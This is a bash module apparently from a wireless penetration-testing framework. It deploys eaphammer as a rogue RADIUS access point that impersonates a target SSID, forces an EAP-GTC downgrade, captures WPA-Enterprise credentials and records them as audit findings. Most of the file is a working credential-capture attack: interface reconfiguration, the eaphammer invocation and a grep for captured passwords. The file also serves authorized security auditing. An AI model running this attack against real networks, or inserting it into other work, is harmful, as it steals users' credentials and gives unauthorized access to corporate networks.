#!/usr/bin/env bash
# MODULE_META
# NAME="WPA-Enterprise / EAP Attack"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="eaphammer"
# DESC="Deploy rogue RADIUS to capture MSCHAPv2/GTC credentials; runs inline asleap for hash cracking"
# REQS="monitor_iface,target_ssid"
# PCAP="yes"
# TIMED="yes"
# DECODE="eap"

#===============================================================================
#  modules/d5_eap_attack.sh
#  D5: WPA-Enterprise / EAP Attack (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
SSID="${GUEST_SSID:-}"
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D5"
EAP_OUT="${EVIDENCE_DIR}/${TC_ID}_eaphammer_results.txt"

# ─── Eaphammer preflight ───────────────────────────────────────────────────────
EAPHAMMER_BIN=""
for _candidate in \
    "$(command -v eaphammer 2>/dev/null)" \
    "/opt/eaphammer/eaphammer" \
    "/usr/local/bin/eaphammer"; do
    if [[ -x "${_candidate:-}" ]]; then
        EAPHAMMER_BIN="$_candidate"
        break
    fi
done
if [[ -z "$EAPHAMMER_BIN" ]]; then
    echo "[!] eaphammer not found. D5 requires eaphammer for rogue RADIUS deployment." >&2
    echo "    Install it:" >&2
    echo "      git clone https://github.com/s0lst1c3/eaphammer /opt/eaphammer" >&2
    echo "      cd /opt/eaphammer && python3 -m pip install -r requirements.txt && sudo ./setup" >&2
    echo "    Or run: sudo bin/wifi-astra setup  (installs build prerequisites)" >&2
    exit 1
fi

if [[ -z "${MONITOR_INTERFACE:-}" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

# Determine interface for hostapd/eaphammer (must be managed mode)
_AP_IFACE="${AP_INTERFACE:-}"
if [[ -n "$_AP_IFACE" ]]; then
    # Full dual-adapter mode — use dedicated managed-mode AP card
    _HOSTAPD_IFACE="$_AP_IFACE"
else
    # Degraded single-adapter mode — derive physical interface from monitor card
    _RAW_IFACE="${WIFI_INTERFACE:-${MONITOR_INTERFACE:-}}"
    if [[ "$_RAW_IFACE" == *mon ]]; then
        _HOSTAPD_IFACE="${_RAW_IFACE%mon}"
    else
        _HOSTAPD_IFACE="$_RAW_IFACE"
    fi
    if [[ -z "$_HOSTAPD_IFACE" ]]; then
        echo "[!] Cannot derive physical interface. Set AP_INTERFACE or ensure WIFI_INTERFACE is set."
        exit 1
    fi
    # Tear down monitor virtual interface before toggling physical adapter
    airmon-ng stop "${MONITOR_INTERFACE}" > /dev/null 2>&1 || true
    # Bring interface to managed mode for hostapd use
    ip link set "$_HOSTAPD_IFACE" down 2>/dev/null || true
    iw dev "$_HOSTAPD_IFACE" set type managed 2>/dev/null || true
    ip link set "$_HOSTAPD_IFACE" up 2>/dev/null || true
    # Restore interface to monitor mode on exit (degraded mode only)
    trap 'airmon-ng start "$_HOSTAPD_IFACE" > /dev/null 2>&1 || {
              ip link set "$_HOSTAPD_IFACE" down 2>/dev/null || true
              iw dev "$_HOSTAPD_IFACE" set type monitor 2>/dev/null || true
              ip link set "$_HOSTAPD_IFACE" up 2>/dev/null || true
          }' EXIT
fi

if [[ -z "$SSID" ]]; then
    echo "[!] GUEST_SSID not set. EAP testing requires a target SSID."
    exit 1
fi

echo "[*] Starting WPA-Enterprise / EAP tests against ${SSID}..."

# 1. Start Telemetry in Background (bounded)
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 50 --status "EAP attack active — ${ELAPSED}s elapsed (Ctrl+C to stop)"
            sleep 5; ELAPSED=$((ELAPSED + 5))
            continue
        fi
        PCT=$(( 10 + (ELAPSED * 80 / SCAN_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing EAP attack..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tool (eaphammer)
RET=0
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Foreground Execution: capture eaphammer exit code via PIPESTATUS, not tee's
    timeout --foreground "$SCAN_TIME" "$EAPHAMMER_BIN" --interface "$_HOSTAPD_IFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes 2>&1 | tee "$EAP_OUT" || true
    RET=${PIPESTATUS[0]}
else
    # Background Execution: wait captures the tool's actual exit code
    timeout "$SCAN_TIME" "$EAPHAMMER_BIN" --interface "$_HOSTAPD_IFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes > "$EAP_OUT" 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID; RET=$?
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Reporting
if [[ ($RET -eq 0 || $RET -eq 124) ]] && [[ -f "$EAP_OUT" ]]; then
    if grep -qiE "credential|mschapv2|gtc_password|eap.*captured" "$EAP_OUT" 2>/dev/null; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "EAP Credential Captured" \
            --desc "Successfully captured WPA-Enterprise credentials via EAP-GTC downgrade against SSID ${SSID}." \
            --severity CRITICAL \
            --evidence "$EAP_OUT" \
            --rationale "Capturing EAP credentials allows for unauthorized access to corporate networks."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[$TC_ID] Audit Complete" \
            --desc "Executed EAP-GTC downgrade attack against SSID ${SSID}. No credentials intercepted." \
            --severity INFO \
            --evidence "$EAP_OUT" \
            --rationale "Enterprise-grade security requires proper EAP configuration."
    fi
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Skipped" \
        --desc "The eaphammer tool is missing or failed." \
        --severity INFO \
        --evidence "$EAP_OUT" \
        --rationale "EAP testing requires specialized tools."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
